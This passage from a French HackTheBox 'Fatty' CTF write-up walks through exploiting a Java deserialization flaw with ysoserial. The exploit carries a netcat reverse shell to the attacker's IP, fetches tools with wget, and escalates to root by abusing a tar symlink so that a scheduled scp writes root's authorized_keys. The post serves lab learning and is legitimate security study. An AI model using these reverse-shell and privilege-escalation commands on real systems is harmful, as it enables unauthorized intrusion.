<p>Pour générer la payload, on va utiliser <a href="https://github.com/frohoff/ysoserial"target="_blank" rel="external nofollow noopener noreferrer">ysoserial</a>, d&rsquo;après le fichier <em>META-INF/maven/fatty-server/fatty-server/pom.xml</em> le serveur utilise la version 3.1 de <em>commons-collections</em>. Il y a donc 5 payloads possibles via <em>ysoserial</em>, on les essayer une par une.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">java -jar ysoserial.jar CommonsCollectionsX <span class="s1">&#39;nc 10.10.14.58 51337 -e /bin/sh&#39;</span> <span class="p">|</span> base64 -w0</span></span></code></pre></td></tr></table>
</div>
</div><p>Ici, X est à remplacer par le numéro de payload. On obtient un base64 que l&rsquo;on va utiliser dans notre code. Pour cela il n&rsquo;y a qu&rsquo;à modifier la ligne</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="na">action</span><span class="p">.</span><span class="na">addArgument</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">serializedUser64</span><span class="p">));</span></span></span></code></pre></td></tr></table>
</div>
</div><p>par</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">b64payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="cm">/* AJOUTER LA PAYLOAD OBTENUE */</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">this</span><span class="p">.</span><span class="na">action</span><span class="p">.</span><span class="na">addArgument</span><span class="p">(</span><span class="n">b46payload</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Comme d&rsquo;habitude on passe par les étapes compilations &amp; création du jar puis on ouvre un listener sur notre machine.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">51337</span></span></span></code></pre></td></tr></table>
</div>
</div><p>On lance le client, se connecte en admin, va dans <em>Change Password</em> puis sans même remplir le formulaire on clique sur <em>Change</em>.</p>
<p>Et là, avec la payload <em>CommonsCollections5</em> on obtient un reverse shell sur la machine.</p>
<p><img loading="lazy" src='/img/fatty_reverse_shell.png' alt="Reverse shell sur Fatty"></p>
<p>Le fichier <em>user.txt</em> n&rsquo;a pas les droits de lecture (sans doute pour obliger les joueurs à avoir un shell pour le lire), on lui donne et le lit.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +r user.txt
</span></span><span class="line"><span class="cl">cat user.txt
</span></span><span class="line"><span class="cl">	7fab2c31fc7173a86872db45ae922073</span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="devenir-root"><span>Devenir root</span>
  <a href="#devenir-root" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h2 class="heading-element" id="obtenir-un-meilleur-shell"><span>Obtenir un meilleur shell</span>
  <a href="#obtenir-un-meilleur-shell" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Avant de devenir root, une première chose à faire est d&rsquo;avoir un shell digne de ce nom. Problème : Comme on l&rsquo;a vu on est dans un docker, il n&rsquo;y a donc quasiment aucun binaire.</p>
<p>Celui dont nous avons le plus besoin est <strong>python</strong>. Pour ça, un dépot git existe : <a href="https://github.com/andrew-d/static-binaries"target="_blank" rel="external nofollow noopener noreferrer">static-binaries</a> !</p>
<p>On va donc le récupérer via un serveur HTTP fait en python sur ma machine.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp
</span></span><span class="line"><span class="cl">wget 10.10.14.58:9000/python2.7 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#Le 2&gt;&amp;1 permet d&#39;avoir le retour du wget</span>
</span></span><span class="line"><span class="cl">wget 10.10.14.58:9000/python2.7.zip 2&gt;<span class="p">&amp;</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">chmod +x python2.7</span></span></code></pre></td></tr></table>
</div>
</div><p>Puis on effectue notre suite de commande habituelle pour avoir un beau shell intéractif</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/python2.7.zip ./python2.7 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">	&lt;Ctrl+Z&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">stty -a <span class="p">|</span> head -n1 <span class="c1">#Je lis les valeurs rows &amp; columns</span>
</span></span><span class="line"><span class="cl">stty raw -echo
</span></span><span class="line"><span class="cl"><span class="nb">fg</span> <span class="c1">#Il faut faire plusieures fois entrée</span>
</span></span><span class="line"><span class="cl">stty rows X columns Y <span class="c1">#Avec X et Y les valeurs lues plus haut</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color	</span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="trouver-le-point-dentrée"><span>Trouver le point d&rsquo;entrée</span>
  <a href="#trouver-le-point-dentr%c3%a9e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Maintenant, il faut trouver comment accéder au root de la machine sachant que nous sommes dans un docker.</p>
<p>J&rsquo;utilise donc <a href="https://github.com/DominicBreuker/pspy"target="_blank" rel="external nofollow noopener noreferrer">pspy</a> pour voir ce qu&rsquo;il se passe (ici encore récupéré via wget). Et on voit chaque minute une commande est executée par notre utilisateur.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash -c scp -f /opt/fatty/tar/logs.tar </span></span></code></pre></td></tr></table>
</div>
</div><p>L&rsquo;option <strong>-f</strong> de scp est non-documentée. En réalité c&rsquo;est un serveur distant qui demande à notre docker de lui envoyer le fichier <em>/opt/fatty/tar/logs.tar</em>. A partir de là on peut établir une hypothèse sur ce qui est executé sur le serveur que l&rsquo;on veut atteindre.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">scp qtc@&lt;IP DOCKER&gt;:/opt/fatty/tar/logs.tar .
</span></span><span class="line"><span class="cl">tar -xvf logs.tar</span></span></code></pre></td></tr></table>
</div>
</div><p>On peut ensuite supposer que ces commandes seront executées en tant que root.</p>
<p>Si ces hypothèses savèrent vraies, alors on peut facilement obtenir le shell root.</p>
<h2 class="heading-element" id="obtenir-un-shell-root"><span>Obtenir un shell root</span>
  <a href="#obtenir-un-shell-root" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Pour obtenir un shell root en exploitant <em>scp</em> et <em>tar</em>, il faut utiliser un lien symbolique.</p>
<p>En effet, une archive peut contenir un lien symbolique. En décompressant celle-ci le lien symbolique est gardé intacte.  Par exemple :</p>
<ul>
<li>
<p>Je créé un lien symbolique</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s /tmp/fichier_test symlink</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Je le met dans une archive</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -cvf archive.tar symlink</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>J&rsquo;envoie ce tar sur un autre machine</p>
</li>
<li>
<p>Je décompresse le tar</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar -xvf archive.tar</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>J&rsquo;écris dans le fichier symlink</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Test test&#34;</span> &gt; symlink</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Le fichier <em>/tmp/fichier_test</em> existe et contient notre test</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/fichier_test
</span></span><span class="line"><span class="cl">	Test test</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>Dans notre cas, nous que la décompression sur le serveur cible transforme <em>logs.tar</em> en lien symbolique vers <em>/root/.ssh/authorized_keys</em> afin de pouvoir, lors d&rsquo;un second scp, écrire sur celui-ci.</p>
<p>Donc on fait comme suit :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s /root/.ssh/authorized_keys logs.tar
</span></span><span class="line"><span class="cl">tar -cvf archive.tar logs.tar
</span></span><span class="line"><span class="cl">cp archive.tar /opt/fatty/tar/logs.tar</span></span></code></pre></td></tr></table>
</div>
</div><p>On attend ensuite un scp (une minute, on peut voir son déclenchement avec <em>pspy</em>). Puis on remplace notre lien symbolique par un fichier contenant notre clef publique SSH</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ssh-rsa AAAAB &lt;REDACTED&gt; vHXw== driikolu@Terweb&#34;</span> &gt; id_rsa.pub
</span></span><span class="line"><span class="cl">cp id_rsa.pub /opt/fatty/tar/logs.tar</span></span></code></pre></td></tr></table>
</div>
</div><p>Là encore on attend le scp puis sur notre machine on fait</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh root@10.10.10.174</span></span></code></pre></td></tr></table>
</div>
</div><p>Et nous avons un accès SSH direct en root. Il ne nous reste plus qu&rsquo;à lire le <em>root.txt</em>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat root.txt 
</span></span><span class="line"><span class="cl">	ee982fa19b413415391ed4a17b2bd9c7</span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>J&rsquo;ai trouvé cette box très intéréssante, c&rsquo;était ma première de niveau &ldquo;Insane&rdquo; et je pense que celui-ci n&rsquo;est pas volé. J&rsquo;ai appris quelques trucs en la faisant (notamment sur CommonsCollections) et ça m&rsquo;a permis de me remettre légèrement au Java.</p>
<p>Par contre, si ça n&rsquo;avait pas été dans un contexte CTF/HackTheBox je pense que je n&rsquo;aurais jamais trouvé la vulnérabilité de désérialisation. Dans ce genre de contexte quasiment tout a un sens et il existait forcément un chemin vers un accès serveur. En cas réel j&rsquo;aurais probablement mis ça de côté.</p>
<p>Même si les clients lourds se font de plus en plus rare dans l&rsquo;informatique, j&rsquo;ai trouvé ça réaliste à ce niveau avec peut-être un bémol sur la <em>privesc</em> qui restait sympathique.</p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Mis à jour le 2025-07-11 11:49:04">Mis à jour le 2025-07-11&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/fatty-wu/index.md" title="Ouvrir le Markdown" class="link-to-markdown">Ouvrir le Markdown</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Partager via X" data-sharer="twitter" data-url="https://driikolu.fr/posts/fatty-wu/" data-title="HackTheBox - Fatty Write-Up" data-via="driikolu"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Partager via Facebook" data-sharer="facebook" data-url="https://driikolu.fr/posts/fatty-wu/"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Partager via 微博" data-sharer="weibo" data-url="https://driikolu.fr/posts/fatty-wu/" data-title="HackTheBox - Fatty Write-Up"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/install_arch_uefi/" class="post-nav-item" rel="prev" title="Installation D&#39;Archlinux en UEFI &amp; Chiffré"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Installation D&#39;Archlinux en UEFI &amp; Chiffré</a><a href="/posts/word_worker_wu/" class="post-nav-item" rel="next" title="BreizhCTF 2022 - Word Worker">BreizhCTF 2022 - Word Worker<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contenus"><h2 class="toc-title">Contenus&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Propulsé par <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.9"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Thème - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.20"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
              <a href="https://x.com/driikolu"target="_blank" rel="external nofollow noopener noreferrer">Driikolu</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Retour en Haut"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Ce site Web fonctionne mieux quand JavaScript est activé.</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copier dans le presse-papiers","editLockTitle":"Verrouiller le bloc de code modifiable","editUnLockTitle":"Déverrouiller le bloc de code modifiable","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"J'ai compris !","link":"En apprendre plus","message":"Ce site Web utilise des Cookies pour améliorer votre expérience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"version":"v0.3.20"};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
</html>
